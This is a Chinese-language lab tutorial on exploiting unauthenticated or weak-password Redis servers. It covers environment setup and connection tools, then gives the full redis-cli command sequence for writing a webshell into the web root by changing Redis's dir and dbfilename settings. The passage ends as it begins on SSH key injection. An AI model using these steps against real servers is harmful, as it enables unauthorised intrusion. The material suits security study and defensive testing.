# 前言
本文主要以redis未授权和redis弱口令漏洞为前提进行利用方式的讲解。
# 环境准备
### 测试环境
redis服务器  
操作系统：Ubuntu 20.04 LTS  
数据库：Redis  
Web容器：Apache 2.4.41  
脚本语言：PHP 7.4.3
攻击机  
kali-rolling 2020.2
## Redis数据库安装
Redis数据库下载地址:[Redis_download](https://download.redis.io/releases/)
解压下载好的redis压缩文件,进去redis文件夹，执行命令完成安装。
    tar -zxvf redis-4.0.0.tar.gz
    cd redis-4.0.0/
    sudo make
    cd /src
    sudo make install
修改`redis.conf`文件，让redis数据库支持外链接，这里我将`bind 127.0.0.1`改为服务器ip地址。
将`daemonize`改为yes，设置成作为后台进程运行。  
如果以守护进程运行，则不会在命令行阻塞，类似于服务。  
如果以非守护进程运行，则当前终端被阻塞。
执行`redis-server`启动redis数据库。
也可以通过执行`redis-server redis-4.0.0/redis.conf`加载redis.conf配置文件后台启动redis。
默认情况下redis是没配置密码的，直接通过kali进行连接然后执行`info`。
完成redis数据库安装。
## Apache和php安装
    sudo apt install apache2    安装apache服务
    service apache2 status    查看apache服务状态
服务为绿色，Apache服务为开启状态。
或者访问localhost查看开启状态，有apache默认页面及正常启动。
默认情况下是监听80端口，若80端口被占用，可以修改`/etc/apache2/ports.conf`内容来修改监听端口。我这里将常用的配置文件简单列出来。
    /etc/apache2/ports.conf    apache服务端口
    /etc/apache2/sites-available/000-default.conf    网站根目录
    /etc/apache2/mods-available/dir.conf    网站默认页面
安装php并且让apache解析php文件。
    sudo apt install php libapache2-mod-php    安装php
执行命令`php -v`查看php版本。
进入网站目录并给网站目录加权限，创建一个php文件对其进行访问，看apache是否成功解析php文件。
    cd /var/www/
    sudo chmod 777 html/
    cd html/
    echo ' 1.php
访问1.php，若出现phpinfo页面则表示apache成功过解析php文件。
若没有解析成功,执行`sudo apt install libapache2-mod-php7.4`安装解析mod。(这里以php7.4为例子)
# 连接方式
对于个人而言，常用的`Redis`数据库的连接方式为：`redis-cli`、`Redis Desktop
Manager`和蚁剑的`redis数据库插件`，通过这三种方式链接过后可以进行数据库的一些命令操作，接下来我就简单的进行这三种方式连接、执行命令的一个演示。
## redis-cli
    sudo apt install redis    安装redis服务
    redis-cli -h host -p port -a password    连接redis数据库
    ip:6379> info    查看redis数据库信息
通过执行`info`命令可以获取数据库相关信息，主要需要得到的信息就是目标的一个操作系统，还有redis数据库的版本。
## Redis Desktop Manage
打开Redis Desktop Manage点击连接到redis服务器，进行目标信息的填写。
测试连接
点击确定，然后打开刚刚创建的连接，`ctrl+T`或者点击打开控制台，进行命令执行。
执行`info`命令。
## 蚁剑redis数据库插件
打开蚁剑->点击`antsword`->选择插件市场->Redis管理，进行插件的安装。
要利用这个插件，首先需要一个shell，这个shell可以是目标，也可以是其他的shell。  
这里就直接在目标服务器上创建一个`shell.php`的文件，蚁剑直接进行连接。
选中添加的shell->加载插件->数据库管理->Redis管理
这里也可以将插件放在首页。点击设置->勾选插件->save，这样选中shell之后，点击上面的按钮就可以方便的使用插件了。
打开插件后，先点击左上角添加，填写目标redis数据库ip和端口，这里我们利用的是目标服务器上的shell，所以这里选择127.0.0.1:6379，若用的其他shell，这里填写目标的ip和端口即可。
打开创建的连接，选中其中一个db，右键，点击执行命令。
执行`info`命令。  
# 利用方式
我会在讲解利用方式的同时进行三种连接方式的演示和讲解利用方式的优劣。
环境:
  * 数据库版本:3.0.0
## 写入webshell
必要条件：
  * 知道网站绝对路径
  * 拥有网站目录写入权限
**redis-cli**
连接数据库，查看信息。
    redis-cli -h 192.168.111.135
    192.168.111.135:6379> info
查看所有键，创建新键，键值为webshell，这里我写入phpinfo进行一个演示。  
因为创建新键赋键值会把原来的键值覆盖，所以需要在赋值的时候需要查看所有的键，然后选择一个没有的键创建赋值。
查看redis数据库配置信息。  
因为我们写Webshell会修改`dir`和`dbfilename`，所以这里查看配置信息主要记下原来的值，好在写入后修改回来。
设置webshell输出目录和文件名，然后写入Webshell。
还原数据库配置。
    keys *    查看所有键
    set x "\n\n"    创建x键并且赋值
    config get *    查看设置默认值
    config set dir /var/www/html    设置文件写入目录
    config set dbfilename 1.php    设置写入文件名
    save    保存，完成文件写入
    del x    删除创建的x键
    config set dir /home/cooltige/redis-3.0.0    设置回原来的目录
    config set dbfilename dump.rdb    设置回原来的文件名
**Redis Desktop Manager**
步骤和redis-cli差不多。  
打开创建的连接，所有存在的键，都会在左边进行一个显示。从这里我们可以看到，`redis-cli`创建的键，默认是选中的`db0`。
查看配置`config get *`
设置shell导出目录和文件名，完成shell写入。
**蚁剑redis数据库插件**
在实际环境中，都已经有了shell了，就没有必要进行webshell的写入。这里我演示就相当于这个shell不是目标的shell。
蚁剑可以通过`keys *`和看左边进行一个键的查看。
步骤都差不多的，我这里直接演示写shell。
通过服务器查看蚁剑写入的文件。
可以看到我们给`w`键赋值的是`"\n\n"`但是写入文件后，`\`不见了。  
通过`get w`，可以看到我们在设置键值的时候`\`就未设置上，所以在写入文件后`\`是不存在的。
将一个`\`变成`\\`就可以成功写入完整内容。
我通过三种方式写入同样的内容到服务器上（键值都有\n），然后进行了一个对比。  
phpinfo.php为redis-cli写的。  
ant.php为蚁剑插件写的。  
manager.php为Redis Desktop Manager写的。
可以看到，只有通过`redis-cli`写入，`\n`在写入的时候才会被当作为换行。  
在这里写入webshell，没有影响，不过在下面的利用方式中就会有很大的影响。
## 写入ssh公钥
必要条件:
  * 知道启动服务的用户
  * 拥有.ssh目录
  * 允许使用基于密钥认证的方式登陆
环境：
  * redis 3.0.0
这里主要讲解2种生成密钥的方法：
  * ssh-keygen
  * xshell